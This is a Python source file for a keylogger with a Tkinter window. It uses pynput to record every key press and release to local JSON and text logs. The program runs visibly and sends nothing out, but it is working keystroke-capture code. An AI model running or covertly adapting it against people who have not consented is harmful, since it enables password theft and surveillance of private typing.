import tkinter as tk
from tkinter import *
from pynput import keyboard
import json

class Keylogger:
    def __init__(self):
        self.keys_used = []
        self.flag = False
        self.keys = ""
        self.listener = None

    def generate_text_log(self, key):
        with open('key_log.txt', "a") as keys_file:
            keys_file.write(key)

    def generate_json_file(self):
        with open('key_log.json', 'w') as key_log:
            json.dump(self.keys_used, key_log)

    def on_press(self, key):
        if not self.flag:
            self.keys_used.append({'Pressed': f'{key}'})
            self.flag = True

        if self.flag:
            self.keys_used.append({'Held': f'{key}'})
        self.generate_json_file()

    def on_release(self, key):
        self.keys_used.append({'Released': f'{key}'})

        if self.flag:
            self.flag = False
        self.generate_json_file()

        self.keys += str(key)
        self.generate_text_log(str(self.keys))

    def start_keylogger(self):
        self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        self.listener.start()
        label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'keylogger.txt'")
        start_button.config(state='disabled')
        stop_button.config(state='normal')

    def stop_keylogger(self):
        if self.listener:
            self.listener.stop()
        label.config(text="Keylogger stopped.")
        start_button.config(state='normal')
        stop_button.config(state='disabled')

keylogger = Keylogger()

root = Tk()
root.title("Keylogger")

label = Label(root, text='Click "Start" to begin keylogging.')
label.config(anchor=CENTER)
label.pack()

start_button = Button(root, text="Start", command=keylogger.start_keylogger)
start_button.pack(side=LEFT)

stop_button = Button(root, text="Stop", command=keylogger.stop_keylogger, state='disabled')
stop_button.pack(side=RIGHT)

root.geometry("250x100") 

root.mainloop()
